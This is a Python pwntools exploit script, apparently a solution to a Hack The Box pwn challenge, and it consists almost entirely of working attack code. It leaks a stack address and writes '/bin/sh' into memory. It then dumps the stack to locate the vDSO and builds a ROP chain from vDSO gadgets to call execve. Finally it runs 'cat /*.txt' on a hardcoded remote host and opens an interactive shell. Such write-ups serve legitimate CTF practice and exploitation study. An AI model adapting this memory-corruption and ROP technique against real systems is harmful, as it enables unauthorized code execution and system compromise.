from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

READ_FUNC    = 0x401000
WRITE_FUNC   = 0x40101b
SYSCALL_RET  = 0x401018
ADD_RSP_30   = 0x401058
LOOP         = 0x4010ab

REMOTE_HOST = '154.57.164.66'
REMOTE_PORT = 30838

def conn():
    if args.REMOTE:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        p = process('./rootfs/challenge')
    return p

p = conn()
p.recvuntil(b'Welcome!\n')

# === Step 1: Stack leak ===
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
log.success(f'Stack Leak: {hex(leak)}')

stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
log.success(f'Stack Base: {hex(stackbase)}')

# === Step 2: Write /bin/sh to stackbase ===
payload = b'B' * 32
payload += p64(READ_FUNC)
payload += p64(LOOP)
payload += p64(0x8)
payload += p64(stackbase)
p.sendline(payload)
p.recvuntil(b'B' * 32)
p.send(b'/bin/sh\x00')

# === Step 3: Dump stack to find vDSO base ===
payload = b'A' * 28 + b'MARK'
payload += p64(WRITE_FUNC)
payload += p64(LOOP)
payload += p64(0x21000)
payload += p64(stackbase)
p.sendline(payload)

p.recvuntil(b'/bin/sh\x00')

stackdump = b''
deadline = time.time() + 10
while time.time() < deadline:
    try:
        chunk = p.recv(4096, timeout=2)
        if chunk:
            stackdump += chunk
            deadline = time.time() + 3
        else:
            break
    except:
        break

log.info(f"Stack dump: {len(stackdump)} bytes")

# Find vDSO via AT_SYSINFO_EHDR (0x21)
vdso_base = None
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break

if vdso_base is None:
    # Fallback: highest page-aligned non-stack address
    for i in range(0, len(stackdump) - 7, 8):
        val = u64(stackdump[i:i+8])
        if 0x7f0000000000 <= val <= 0x7fffffffffff and (val & 0xFFF) == 0:
            if abs(val - leak) > 0x100000:
                if vdso_base is None or val > vdso_base:
                    vdso_base = val

if vdso_base is None:
    log.error("Could not find vDSO base!")
    p.close()
    exit(1)

log.success(f'vDSO Base: {hex(vdso_base)}')

# === Step 4: ROP to shell using vDSO gadgets ===
# Gadgets (offsets from vDSO base):
POP_RDX_RAX_RET       = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET   = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_RSI_R12   = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall

log.info(f"pop rdx; pop rax; ret      = {hex(POP_RDX_RAX_RET)}")
log.info(f"pop rbx; pop r12; pop rbp  = {hex(POP_RBX_R12_RBP_RET)}")
log.info(f"mov rdi,rbx; mov rsi,r12; syscall = {hex(MOV_RDI_RBX_RSI_R12)}")

# execve("/bin/sh", NULL, NULL)
# rax = 59, rdi = &"/bin/sh", rsi = 0, rdx = 0
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve syscall number
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx -> rdi = &"/bin/sh"
payload += p64(0x0)              # r12 -> rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_RSI_R12)  # mov rdi,rbx; mov rsi,r12; syscall

log.info("Sending execve ROP chain...")
p.sendline(payload)

time.sleep(1)
p.sendline(b'cat /*.txt')
time.sleep(1)

try:
    output = p.recv(timeout=5)
    log.info(f"Output: {output}")
    if b'HTB{' in output:
        flag = output[output.index(b'HTB{'):output.index(b'}', output.index(b'HTB{'))+1]
        log.success(f"FLAG: {flag.decode()}")
        with open('flag.txt', 'w') as f:
            f.write(flag.decode())
except:
    pass

p.interactive()
